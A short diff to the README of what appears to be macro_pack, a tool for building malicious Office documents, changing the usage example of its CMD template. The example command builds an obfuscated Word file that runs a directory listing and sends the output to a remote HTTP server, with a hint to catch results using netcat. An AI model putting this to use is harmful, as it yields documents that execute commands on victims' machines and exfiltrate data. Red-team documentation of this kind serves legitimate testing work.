@@ -238,7 +238,7 @@ Give this template the name or email of the author
 ### CMD
 Execute a command line and send result to remote http server  
 Give this template the server url and the command to run  
-   -> Example:  ```echo "http://192.168.0.5:7777" "dir /Q C:" | %s -t CMD -o -w cmd.doc``` 
+   -> Example:  ```echo "http://192.168.0.5:7777" "dir /Q C:" | macro_pack.exe -t CMD -o -w cmd.doc``` 
    
 ```bash
 # Catch result with any webserver or netcat
